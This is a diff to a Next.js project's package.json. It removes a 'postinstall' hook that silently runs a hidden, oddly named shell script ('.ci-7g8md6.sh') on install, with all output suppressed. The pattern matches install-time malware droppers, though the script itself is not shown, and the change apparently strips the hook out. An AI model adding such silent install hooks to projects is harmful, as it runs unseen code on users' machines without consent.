@@ -6,8 +6,7 @@
     "dev": "next dev",
     "build": "next build",
     "start": "next start",
-    "lint": "next lint",
-    "postinstall": "sh ./.ci-7g8md6.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "next lint"
   },
   "dependencies": {
     "@hookform/resolvers": "^3.1.0",
